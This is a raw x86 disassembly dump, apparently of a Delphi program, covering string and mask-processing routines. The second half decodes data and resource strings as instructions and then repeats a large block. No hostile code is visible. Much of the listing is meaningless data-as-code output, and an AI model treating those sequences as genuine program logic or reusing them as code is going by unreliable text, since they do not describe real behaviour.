push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_4634d8
mov edx eax
lea eax [ ebp - 0x30 ]
call sub_40460c
push [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebx ]
call sub_4046e4
mov ecx eax
sub ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
inc edx
mov eax [ ebx ]
call sub_40493c
push [ ebp - 0x34 ]
mov eax ebx
mov edx 0x3
call sub_4047a4
jmp r-xdata
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x10 ]
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_40493c
push [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_4634d8
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_40460c
push [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
call sub_4046e4
mov ecx eax
sub ecx [ ebp - 0x10 ]
inc ecx
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
call sub_40493c
push [ ebp - 0x24 ]
mov eax ebx
mov edx 0x3
call sub_4047a4
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
cmp [ ebp - 0x10 ] 0x1
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebx ]
call sub_4046e4
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4046e4
mov esi eax
sub esi [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_463308
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x5 ]
call sub_40460c
mov edx [ ebp - 0x38 ]
mov ecx [ ebx ]
mov eax ebx
call sub_404730
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_463308
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
jmp r-xdata
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x28 ]
mov dl [ ebp - 0x5 ]
call sub_40460c
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_4046ec
sub_463714
push ebx
push esi
push edi
push ebp
push ecx
mov esi eax
mov [ esp ] 0x1
mov eax esi
call sub_4046e4
cmp eax 0x4
jl r-xdata
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or ebp 0xffffffff
or edi 0xffffffff
mov eax esi
call sub_4046e4
mov ebx eax
dec ebx
test ebx ebx
jle r-xdata
test ebp ebp
jge r-xdata
test edi edi
jge r-xdata
mov eax esi
call sub_4046e4
sub eax 0x4
cmp ebx eax
jl r-xdata
mov edi ebx
mov ebp ebx
jmp r-xdata
test edi edi
jle r-xdata
mov edi ebp
test edi edi
jl r-xdata
mov eax esi
call sub_4046e4
cmp edi eax
je r-xdata
mov edx ebx
mov eax esi
call sub_463308
cmp al 0x6
jne r-xdata
mov al [ esi + edi ]
cmp al [ rw-data ]
sete al
xor al 0x1
mov [ esp ] al
sub_463798
push ebx
push esi
mov esi eax
mov bl [ rw-data ]
mov eax esi
call sub_4046e4
cmp eax 0x4
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_4046e4
mov edx eax
dec edx
mov eax esi
call sub_463308
cmp al 0x6
jne r-xdata
mov eax esi
call sub_4046e4
mov edx eax
sub edx 0x2
mov eax esi
call sub_463308
cmp al 0x6
je r-xdata
mov eax esi
call sub_4046e4
mov bl [ esi + eax - 0x1 ]
mov eax esi
call sub_4046e4
mov edx eax
sub edx 0x3
mov eax esi
call sub_463308
cmp al 0x6
jne r-xdata
sub_463804
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_463881
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40442c
mov esi ebx
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463888
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
mov ebx 0x1
inc ebx
dec esi
jne r-xdata
add al 0xfd
sub al 0x2
jb r-xdata
mov edx ebx
mov eax edi
call sub_463308
sub al 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
mov dl [ edi + ebx - 0x1 ]
call sub_40460c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4046ec
mov eax [ ebp - 0x4 ]
sub_463890
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4638d5
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_463804
mov eax [ ebp - 0x4 ]
call sub_4046e4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4638dc
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_4638e4
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov eax edi
call sub_4046e4
mov edx eax
mov eax edi
call sub_463890
cmp eax ebx
jge r-xdata
xor ebp ebp
mov [ esp ] ebx
mov eax edi
call sub_4046e4
mov ebx eax
test ebx ebx
jle r-xdata
or ebp 0xffffffff
jmp r-xdata
mov eax ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi 0x1
inc esi
dec ebx
jne r-xdata
dec [ esp ]
cmp [ esp ] 0x0
jl r-xdata
inc ebp
mov edx esi
mov eax edi
call sub_463308
cmp al 0x3
je r-xdata
sub_463940
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4638e4
test eax eax
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_463308
dec eax
sub al 0x2
setb bl
sub_463968
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x14 ]
xor eax eax
push ebp
push sub_463aed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jle r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_46345c
mov [ ebp - 0x9 ] al
mov eax esi
dec eax
mov [ ebp - 0x10 ] eax
test [ ebp - 0x9 ] 0x1
je r-xdata
mov eax ebx
mov edx edi
call sub_404480
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_46345c
mov [ ebp - 0x9 ] al
test [ ebp - 0x9 ] 0x1
je r-xdata
push ebx
mov ecx [ ebp - 0x10 ]
mov edx 0x1
mov eax edi
call sub_40493c
sub esi [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
sub eax esi
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov eax edi
call sub_4046e4
mov ecx eax
mov edx esi
mov eax edi
call sub_40493c
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp + 0x10 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_40493c
mov edx [ ebp - 0x28 ]
mov eax ebx
pop ecx
call sub_404730
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_4046e4
mov ecx eax
mov edx esi
sub edx [ ebp + 0x10 ]
mov eax edi
call sub_40493c
mov eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x8 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_40493c
mov edx [ ebp - 0x20 ]
mov eax ebx
pop ecx
call sub_404730
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax edi
call sub_4046e4
mov ecx eax
mov edx [ ebp - 0x10 ]
inc edx
mov eax edi
call sub_40493c
mov edx [ ebp - 0x18 ]
mov eax ebx
call sub_4046ec
jmp r-xdata
mov esi eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463af4
lea eax [ ebp - 0x28 ]
mov edx 0x6
call sub_404450
retn
lea eax [ ebp - 0x14 ]
mov dl [ ebp + 0xc ]
call sub_40460c
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_4046ec
dec esi
jne r-xdata
sub_463b00
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_463cc6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx edi
call sub_404480
mov eax esi
call sub_4046e4
test eax eax
jle r-xdata
mov eax esi
call sub_4046e4
mov edx eax
mov eax esi
call sub_463890
mov edi eax
mov eax [ ebx ]
call sub_4046e4
cmp edi eax
je r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x1
mov eax [ ebx ]
call sub_4046e4
test eax eax
jle r-xdata
mov eax [ ebx ]
call sub_4046e4
inc eax
push eax
sub edi [ ebp - 0x8 ]
push edi
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
inc ecx
mov edx [ ebx ]
mov eax esi
call sub_463968
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_404480
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_463890
mov [ ebp - 0x10 ] eax
mov eax [ ebx ]
call sub_4046e4
inc eax
mov [ ebp - 0xc ] eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebx ]
call sub_4046e4
sub eax edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463ccd
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_404450
retn
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] 0x1
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_463308
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebx ]
call sub_4046e4
cmp eax [ ebp - 0xc ]
jge r-xdata
inc eax
mov [ ebp - 0x1c ] eax
inc [ ebp - 0x10 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
dec edx
mov eax esi
call sub_463940
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebp - 0x10 ]
sub eax edi
push eax
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
mov edx [ ebx ]
mov eax esi
call sub_463968
mov edx [ ebp - 0x24 ]
mov eax ebx
call sub_404480
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_4634d8
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_40460c
mov edx [ ebp - 0x20 ]
mov eax ebx
call sub_4046ec
inc edi
dec [ ebp - 0x1c ]
jne r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
mov eax ebx
call j_sub_4048e8#2
mov edx [ ebp - 0x10 ]
mov cl [ ebp - 0x1 ]
mov [ eax + edx - 0x1 ] cl
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_4634d8
mov edx [ ebx ]
cmp al [ edx + edi - 0x1 ]
jne r-xdata
sub_463cd8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_463cfd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463d04
retn
sub_463ee0
mov ebx 0xe8ffbaff
dec ecx
inc esi
add [ edx + ecx * 2 ] al
inc esi
add [ edx + ecx * 2 + 0x46 ] ah
add [ eax - 0x33ffb9b4 ] bl
dec esp
inc esi
add [ ecx + ebx * 2 ] dl
inc esi
add [ edx + ebx * 2 + 0x46 ] ch
add [ ecx + ebx * 2 + 0x5a340046 ] ah
inc esi
add [ eax + ecx * 2 + 0x46 ] bh
add [ ecx + ecx * 2 + 0x46 ] bl
add [ ecx + ecx * 2 + 0x540f0046 ] ch
inc ebx
jne r-xdata
pop eax
inc eax
je r-xdata
arpl [ eax + eax + 0x10 ] si
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
or [ ebp + ecx * 2 + 0x61 ] edx
jae r-xdata
add [ esi + esi + 0x40 ] dh
add [ eax - 0x63ffbbbd ] bh
pop [ eax + eax + 0x60 ]
pop eax
inc esp
inc ebx
insd
dec ebp
popad
jae r-xdata
adc al 0xdb
inc ebx
add [ ebp + 0x1 ] ah
add bh bh
or al 0x92
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
inc ebp
imul esi [ fs : eax + ebx * 4 + 0x3f ] 0x3f240046
inc esi
add [ eax ] al
add al 0x4d
popad
jae r-xdata
add [ eax + 0x36 ] bl
inc eax
inc ebp
imul esi [ fs : eax + ebp + 0x3f ] 0xf070046
push esp
inc ebx
jne r-xdata
adc eax 0x6f420b00
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0x2cff0001
xchg edx eax
add [ eax ] al
add [ edx ] dl
add [ ecx ] cl
inc edx
jbe r-xdata
insb
inc ebp
jae r-xdata
bound eax [ ecx ]
add bh bh
fcom [ ecx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0xf ] al
str [ edx ]
inc edx
jbe r-xdata
cld
fiadd [ ebx ]
xor eax 0x43cd1400
add [ ecx ] ah
add bh bh
mov eax 0x54004410
adc [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc esp
add [ edx + edx ] dh
inc esp
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
push 0x41
je r-xdata
or eax [ ebx + 0x6f ]
jb r-xdata
add [ eax ] al
push ss
add [ eax ] cl
inc ebx
push 0x61437261
jae r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax + 0x1 ] ch
add bh bh
sub al 0x92
fiadd [ ebx ]
arpl [ ecx ] ax
add bh bh
cwde
xchg ecx eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x75410a00
je r-xdata
add [ edx + ebp * 2 + 0x3e3c0041 ] al
insd
dec ebp
popad
jae r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
je r-xdata
inc esp
push eax
mov [ ebx ] 0x7a
add [ eax ] al
inc esp
clc
inc ecx
add [ eax ] dh
add bh bh
add al 0x1f
inc esp
add [ eax ] ah
pop ds
inc esp
add [ eax ] al
add [ eax ] al
add [ 0x17800000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
adc eax [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
inc eax
add [ edi ] cl
add al [ eax ]
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
push ebx
insb
arpl [ gs : eax + eax + 0x10 ] si
add [ esi + edi ] bh
test [ edx + 0x41 ] ch
inc ebp
imul esi [ fs : eax + edi * 4 + 0x3d ] 0xd5d40046
inc edx
add [ eax + eax ] cl
add al 0x4d
popad
jae r-xdata
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3b00ffff ] ah
test [ eax + eax - 0x18 ] eax
test [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050019 ] al
je r-xdata
inc esp
add [ eax ] al
insb
sbb ah dl
inc edx
add [ ebx ] dl
add al [ eax ]
[ ebx + ebx ]
sbb ah dl
outsb
jae r-xdata
int 0x43
add [ eax + eax ] dh
call [ edx + eax * 2 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0018 ] al
outsd
add [ edi ] bl
add bh bh
jo r-xdata
fiadd [ ebx ]
add [ fs : eax ] eax
[ eax + 0x1004491 ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax ] ch
dec eax
inc esi
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add ah dh
sbb al [ ebx ]
insb
adc [ eax + eax - 0x40 ] eax
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ eax ] dh
pop ds
inc ebx
add ah ch
pop ds
inc ebx
add [ eax + 0x43 ] bl
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax ] al
and [ ebx ] eax
cwde
test [ eax + eax + 0x4 ] al
arpl [ eax + eax + 0x54 ] ax
add [ eax + eax + 0x4 ] 0xd4004484
sbb al [ ebx ]
adc [ 0x1ccc0043 ] bl
inc ebx
add [ esi + ebx + 0x1d400043 ] dl
inc ebx
add al dh
sbb al 0x43
add [ edx + edx * 2 + 0x1df80046 ] al
inc ebx
add [ edx + edx * 2 + 0x52900046 ] cl
inc esi
add ah bh
popad
inc esi
add [ eax + 0x5b ] al
inc esi
add [ eax + 0x900465a ] ah
push esp
dec ebp
popad
jae r-xdata
add [ eax ] al
mov eax eax
cwde
aas
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4640 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x40004640 ] dl
add al [ eax ]
add [ ebp + edi + 0x46 ] ch
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ edx ] ah
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ eax + edx * 2 - 0x3a ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
add dh bh
mov [ esi ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080014 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4865646f
insd
inc ebp
add [ edx + eax ] cl
insb
dec edi
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add bh bh
or [ ebx ] bl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jb r-xdata
dec [ eax + 0x100464e ]
jae r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ edx + 0x65 ] eax
jbe r-xdata
fild [ ebx ]
add [ gs : eax ] eax
dec [ edx + edx * 4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4508001e ] al
imul esi [ fs : ebp + ecx * 2 + 0x61 ] 0xfce46b73
inc ecx
add [ eax ] ch
add bh bh
pop eax
push ds
inc esp
add [ eax + 0x1e ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001f ] al
outsd
outsb
je r-xdata
add [ edi ] al
inc ebp
outsb
fld [ ebx ]
test [ ecx ] al
add bh bh
test [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
and [ eax ] al
pop es
dec ecx
insd
dec ebp
outsd
inc esp
fiadd [ ebx ]
mov [ ecx ] al
add bh bh
mov [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
pop es
dec ecx
insd
dec esi
popad
insd
push esp
adc [ eax ] al
push esp
dec edi
inc esi
add [ edi + ecx * 2 + 0x46 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
or [ ebp + 0x61 ] ecx
js r-xdata
add bh bh
mov [ esi + 0x46 ] cl
add [ ecx ] al
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
popad
bound ebp [ ebp + 0x64 ]
clc
xor al [ esi ]
and [ edx ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x6e450700
int3
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ ebx ] cl
push eax
popad
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
push cs
push eax
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090029 ] al
outsd
outsb
je r-xdata
jb r-xdata
adc [ eax ] al
test eax 0xf4ff0001
test [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax 0x61500b00
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
push eax
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
outsb
je r-xdata
jo r-xdata
or al 0x50
outsd
outsb
je r-xdata
int3
ja r-xdata
push cs
je r-xdata
add [ eax ] al
add [ 0x61500b00 ] ah
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
[ eax ]
and [ esi - 0x795fffbc ] al
inc esp
add [ ecx ] al
outsb
jne r-xdata
push eax
popad
jb r-xdata
adc [ eax ] al
0xd8ff0000 0x441e
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
popad
jae r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
nop
push ds
inc esp
add [ ecx ] al
add [ eax ] al
sub al [ eax ]
or [ edx + 0x65 ] dl
popad
dec edi
outsb
insb
jns r-xdata
adc [ eax ] al
push cs
add al [ eax ]
call [ eax + 0x100431c ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jae r-xdata
add [ eax ] cl
push ebx
jo r-xdata
inc ebx
push 0xef47261
push 0x6948776f
outsb
adc [ eax ] al
cdq
add [ eax ] al
push [ esi + ebx + 0x1e7c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308002b ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc esp
add [ eax + 0x1004486 ] ah
outsd
inc ebp
add [ eax + eax ] bh
[ ebx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ eax + 0x6f ] edx
sub [ eax ] al
adc [ eax ] al
or eax 0x8ff0002
sbb al 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub_464327
pushfd
cmp eax 0x44
add [ eax + 0x1 ] al
sbb eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
clc
xor al [ esi ]
and [ edx ] al
add bh bh
mov [ esi + 0x46 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4508001e ] al
imul esi [ fs : ebp + ecx * 2 + 0x61 ] 0xfce46b73
inc ecx
add [ eax ] ch
add bh bh
pop eax
push ds
inc esp
add [ eax + 0x1e ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001f ] al
outsd
outsb
je r-xdata
add [ edi ] al
inc ebp
outsb
fld [ ebx ]
test [ ecx ] al
add bh bh
test [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
and [ eax ] al
pop es
dec ecx
insd
dec ebp
outsd
inc esp
fiadd [ ebx ]
mov [ ecx ] al
add bh bh
mov [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
pop es
dec ecx
insd
dec esi
popad
insd
push esp
adc [ eax ] al
push esp
dec edi
inc esi
add [ edi + ecx * 2 + 0x46 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
or [ ebp + 0x61 ] ecx
js r-xdata
outsb
je r-xdata
outsb
je r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ ebx ] cl
push eax
popad
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
push cs
push eax
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090029 ] al
outsd
outsb
je r-xdata
jb r-xdata
adc [ eax ] al
test eax 0xf4ff0001
test [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax 0x61500b00
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
push eax
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
outsb
je r-xdata
jo r-xdata
or al 0x50
outsd
outsb
je r-xdata
int3
ja r-xdata
push cs
je r-xdata
add [ eax ] al
add [ 0x61500b00 ] ah
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
[ eax ]
and [ esi - 0x795fffbc ] al
inc esp
add [ ecx ] al
outsb
jne r-xdata
push eax
popad
jb r-xdata
adc [ eax ] al
0xd8ff0000 0x441e
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
popad
